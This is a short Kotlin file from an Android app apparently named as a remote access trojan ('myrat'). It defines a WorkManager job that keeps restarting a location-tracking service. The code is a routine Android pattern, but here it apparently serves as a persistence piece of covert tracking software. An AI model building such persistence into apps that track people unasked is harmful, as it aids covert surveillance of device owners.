package com.myrat.app.worker
import android.content.Context
import android.content.Intent
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.myrat.app.service.LocationService
import com.myrat.app.utils.Logger

class ServiceCheckWorker(appContext: Context, params: WorkerParameters) : Worker(appContext, params) {
    override fun doWork(): Result {
        val context = applicationContext
        val intent = Intent(context, LocationService::class.java)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
        Logger.log("WorkManager triggered service check")
        return Result.success()
    }
}